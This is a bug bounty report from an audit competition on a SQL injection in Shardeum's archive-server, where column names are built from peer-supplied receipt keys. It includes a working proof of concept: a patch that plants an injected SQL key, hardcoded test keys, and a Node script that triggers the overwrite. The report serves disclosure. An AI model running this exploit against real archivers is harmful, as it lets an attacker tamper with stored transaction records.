# #35903 \[W\&A-High] SQL Injection Allows a Malicious Archiver to Overwrite Receipt/originalTxData Data

**Submitted on Oct 12th 2024 at 14:00:02 UTC by @hulkvision for** [**Audit Comp | Shardeum: Ancillaries II**](https://immunefi.com/audit-competition/shardeum-ancillaries-ii-boost)

* **Report ID:** #35903
* **Report Type:** Websites and Applications
* **Report severity:** High
* **Target:** <https://github.com/shardeum/archive-server/tree/dev>
* **Impacts:**
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

## Description

## Brief/Intro

Due to a SQL injection vulnerability a malicious Archiver can connect to the network, become a valid active Archiver, and overwrite all receipt data and original transaction from receipt and originalTXsData database across all active Archivers.

## Vulnerability Details

Archiver server periodically collect missing txs data in every 1 second from active archiver servers in the network. \`\`\` scheduleMissingTxsDataQuery = (): void => { // Set to collect missing txs data in every 1 second setInterval(() => { collectMissingTxDataFromArchivers() }, 1000) } \`\`\` An active archiver server(say archiver2) can call \`/gossip-data\` to target archiver server(say archiver1) with \`txId\` and \`timestamp\` to add \`txId\` to its \`missingReceiptsMap\`.

In \`src/Data/Collector.ts\`, the server calls \`collectMissingTxDataFromArchivers\` > \`collectMissingReceipts\` \`\`\` export const collectMissingReceipts = async ( senders: string\[], txId: string, txTimestamp: number ): Promise\<void> => { //...// const receipts = (await queryTxDataFromArchivers( senderArchiver, DataType.RECEIPT, txIdList )) as Receipt.Receipt\[] //...// if (txId === receiptId && txTimestamp === timestamp) { storeReceiptData(\[receipt], senderArchiver.ip + ':' + senderArchiver.port, true) foundTxData = true } //...// \`\`\` In this function the target archiver server(archiver1) is calling the gossip initiator archiver server(archiver2) for missing receipt, and if the \`if (txId === receiptId && txTimestamp === timestamp)\` is true it will call storeReceiptData function with data received gossip initiator archiver server.

\`\`\` export const storeReceiptData = async ( receipts: Receipt.ArchiverReceipt\[], senderInfo = '', verifyData = false, saveOnlyGossipData = false ): Promise\<void> => { //..// console.log("Receipt From inside storeReceiptData:\n",receipts) for (let receipt of receipts) { //...// if (missingReceiptsMap.has(tx.txId)) missingReceiptsMap.delete(tx.txId) combineReceipts.push({ ...receipt, // receipt object is received from malicious archiver server receiptId: tx.txId, timestamp: tx.timestamp, applyTimestamp, })

// Receipts size can be big, better to save per 100 if (combineReceipts.length > 0) { await Receipt.bulkInsertReceipts(combineReceipts) if (State.isActive) sendDataToAdjacentArchivers(DataType.RECEIPT, txDataList) } if (combineAccounts.length > 0) await Account.bulkInsertAccounts(combineAccounts) if (combineTransactions.length > 0) await Transaction.bulkInsertTransactions(combineTransactions) if (combineProcessedTxs.length > 0) await ProcessedTransaction.bulkInsertProcessedTxs(combineProcessedTxs)

} \`\`\` In \`storeReceiptData\` function there is no validation made on the receipt object received from archiver2 server and it is being passed to \`Receipt.bulkInsertReceipts(combineReceipts)\` In \`src/dbstore/receipts.ts\` \`\`\` export async function bulkInsertReceipts(receipts: Receipt\[]): Promise\<void> { try { const fields = Object.keys(receipts\[0]).join(', ') const placeholders = Object.keys(receipts\[0]).fill('?').join(', ') const values = db.extractValuesFromArray(receipts) let sql = 'INSERT OR REPLACE INTO receipts (' + fields + ') VALUES (' + placeholders + ')' for (let i = 1; i < receipts.length; i++) { sql = sql + ', (' + placeholders + ')' } console.log("bulk insertreceipt:\n",sql) await db.run(receiptDatabase, sql, values) if (config.VERBOSE) Logger.mainLogger.debug('Successfully inserted Receipts', receipts.length) } catch (e) { Logger.mainLogger.error(e) Logger.mainLogger.error('Unable to bulk insert Receipts', receipts.length) } } \`\`\` The \`bulkInsertReceipts\` function is extracting keys from received receipts object and constructing the sql query.

The received receipt response from archiver2 looks like this \`\`\` \[ { afterStates: \[ \[Object] ], appReceiptData: { accountId: '7b8a87c32920166e9926a0d83796fc81bdb1f6d2afbfa5b80213caa955f1f9c1', data: \[Object], stateId: 'f1c881c89aedca2c35735e0f76462b6c276fd3b7beb3a8cae4a1d6a8badbb435', timestamp: 1728731343281 }, applyTimestamp: 1728731343281, beforeStates: \[], cycle: 2, executionShardKey: '', globalModification: true, receiptId: '7b8a87c32920166e9926a0d83796fc81bdb1f6d2afbfa5b80213caa955f1f9c1', signedReceipt: {}, timestamp: 1728731343281, tx: { originalTxData: \[Object], timestamp: 1728731343281, txId: '7b8a87c32920166e9926a0d83796fc81bdb1f6d2afbfa5b80213caa955f1f9c1' } } ] \`\`\` and the constructed sql query looks like this \`\`\` INSERT OR REPLACE INTO receipts (afterStates, appReceiptData, applyTimestamp, beforeStates, cycle, executionShardKey, globalModification, receiptId, signedReceipt, timestamp, tx) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) \`\`\` you can see the keys from received receipt object is used to construct the SQL query.

The vulnerability here is a malicious Archiver controls the receipts object and can send arbitrary keys with receipt object thus it can control the sql query constructed by the victim Archiver and execute arbitrary sql payloads allowing malicious Archiver to control all the data stored in received database of victim Archiver.

The same vulnerability exists for \`collectMissingOriginalTxsData\` > \`storeOriginalTxData\` > \`bulkInsertOriginalTxsData\`. It is also constructing data received SQL query from malicious archiver server. <https://github.com/shardeum/archive-server/blob/0337daa477b3a30f8fb65b87c23b021a261441bd/src/dbstore/originalTxsData.ts#L49-L65>

## Impact Details

* The vulnerability allows bulk modification of data stored in the Receipts, OriginalTxsData databases of all the active Archiver in the network.
* Using this vulnerability the global modification flag could be set true for all the receipts stored, and validations made by the joining archiver server for existing receipts would be bypassed.

## References

## Proof of Concept

## Proof of Concept

1. Start the local Shardeum network.
2. Compile the malicious archiver server with the following modification

* modify the patch with following changes >$ORIGINAL\_TXID - you can get receiptId and timestamp from \`instances/archiver-db-4000/receipts.sqlite3 \` > Replace the receiptId and timestamp in place of $ORIGINAL\_TXID and $TIMESTAMP in patch \`\`\` diff --git a/archiver-config.json b/archiver-config.json index 7fafd0a..57eb438 100644 --- a/archiver-config.json +++ b/archiver-config.json @@ -1,9 +1,9 @@ {
* "ARCHIVER\_IP": "0.0.0.0",
* "ARCHIVER\_PORT": 4000,
* "ARCHIVER\_IP": "127.0.0.1",
* "ARCHIVER\_PORT": 4002, "ARCHIVER\_HASH\_KEY": "",
* "ARCHIVER\_PUBLIC\_KEY": "",
* "ARCHIVER\_SECRET\_KEY": "",
* "ARCHIVER\_PUBLIC\_KEY": "d75125187149cfb7b4b381cf891aceb27f661e084246a9415a29134ea5ea5f2d",
* "ARCHIVER\_SECRET\_KEY": "5a95cd34671e7ecfb5e440e18be5131820ef3dc807e5cbccabccf19b09a8f0c2d75125187149cfb7b4b381cf891aceb27f661e084246a9415a29134ea5ea5f2d", "archivers": \[ { "ip": "127.0.0.1", @@ -56,6 +56,6 @@ "publicKey": "aec5d2b663869d9c22ba99d8de76f3bff0f54fa5e39d2899ec1f3f4543422ec7" } ],
* "ARCHIVER\_MODE": "release",
* "ARCHIVER\_MODE": "debug", "DevPublicKey": "" -} \ No newline at end of file +} diff --git a/src/API.ts b/src/API.ts index 73f5da7..c63ac3e 100644 --- a/src/API.ts +++ b/src/API.ts @@ -551,7 +551,8 @@ export function registerRoutes(server: FastifyInstance\<Server, IncomingMessage, reply.send({ success: false, error: result.error }) return }
* const { count, start, end, startCycle, endCycle, type, page, txId, txIdList } = \_request.body
* let { count, start, end, startCycle, endCycle, type, page, txId, txIdList } = \_request.body
* txId = "$ORIGINAL\_TXID" let receipts: (ReceiptDB.Receipt | ReceiptDB.ReceiptCount)\[] | number = \[] if (count) { if (count <= 0 || Number.isNaN(count)) { @@ -647,6 +648,9 @@ export function registerRoutes(server: FastifyInstance\<Server, IncomingMessage, receipts = await ReceiptDB.queryReceiptsBetweenCycles(skip, limit, from, to) } }
* receipts\[0].receiptId="92092c816f47ed0b8d2ee4700557f1b2a61710430108b2aa59f40b08a527e5fg"
* delete receipts\[0].appReceiptData
* receipts\[0]\["appReceiptData, applyTimestamp, beforeStates, cycle, executionShardKey, globalModification, receiptId, signedReceipt, timestamp, tx) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?),('','',2,'',18,'',1,'$ORIGINAL\_TXID','','','');"] = "hii" const res = Crypto.sign({ receipts, }) diff --git a/src/Config.ts b/src/Config.ts index 49bb21a..69cda2a 100644 --- a/src/Config.ts +++ b/src/Config.ts @@ -127,7 +127,7 @@ let config: Config = { save: true, interval: 1, },
* ARCHIVER\_MODE: 'release', // 'debug'/'release'
* ARCHIVER\_MODE: 'debug', // 'debug'/'release' DevPublicKey: '', dataLogWrite: true, dataLogWriter: { diff --git a/src/dbstore/receipts.ts b/src/dbstore/receipts.ts index 65591ff..023d3e4 100644 --- a/src/dbstore/receipts.ts +++ b/src/dbstore/receipts.ts @@ -40,6 +40,7 @@ export interface ArchiverReceipt { appReceiptData: object & { accountId?: string; data: object } executionShardKey: string globalModification: boolean
* "appReceiptData, applyTimestamp, beforeStates, cycle, executionShardKey, globalModification, receiptId, signedReceipt, timestamp, tx) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?),('','',2,'',18,'',1,'$ORIGINAL\_TXID','','','');":string }

export type AppliedVote = {

\`\`\` 3. Start the malicious archiver and provide ARCHIVER\_INFO=ip:port:public\_key, so the malicious archiver can connect to the main archiver. 4. Run the exploit command \`node exploit.mjs\` \`\`\` import axios from 'axios'; import \* as core from '@shardus/crypto-utils' import { Utils as StringUtils } from '@shardus/types'

const TARGET\_URL='<http://127.0.0.1:4000>' const PRIVATE\_KEY='5a95cd34671e7ecfb5e440e18be5131820ef3dc807e5cbccabccf19b09a8f0c2d75125187149cfb7b4b381cf891aceb27f661e084246a9415a29134ea5ea5f2d' const PUBLIC\_KEY='d75125187149cfb7b4b381cf891aceb27f661e084246a9415a29134ea5ea5f2d'

export function sign(obj) { const objCopy = StringUtils.safeJsonParse(core.stringify(obj)) core.signObj(objCopy, PRIVATE\_KEY, PUBLIC\_KEY) return objCopy }

async function main(){ console.log('exploiting archiver-server')

```
    core.init(&#x27;69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc&#x27;)
    let payload &#x3D; {
            &#x27;dataType&#x27;: &#x27;RECEIPT&#x27;,
            &#x27;data&#x27;: [{&#x27;txId&#x27;: &#x27;92092c816f47ed0b8d2ee4700557f1b2a61710430108b2aa59f40b08a527e5fg&#x27;, &#x27;timestamp&#x27;: $TIMESTAMP}]
    }
    payload &#x3D; sign(payload)
    const r &#x3D; await axios.post(TARGET_URL + &#x27;/gossip-data&#x27;, payload)
    console.log(&#x27;success&#x27;, r.data)
```

}

main()

\`\`\` 5. The main archiver will send a request to the malicious archiver 6. The malicious archiver will respond with crafted account data which will modify the receipt data. 7. On the victim archiver, go to the archiver database in server/instances/archiver-db-4000 \`sqlite3 receipts.sqlite3\` 8. check the receipt data has changed \`select \* from receipts where receiptId='ORIGINAL\_TXID';\`
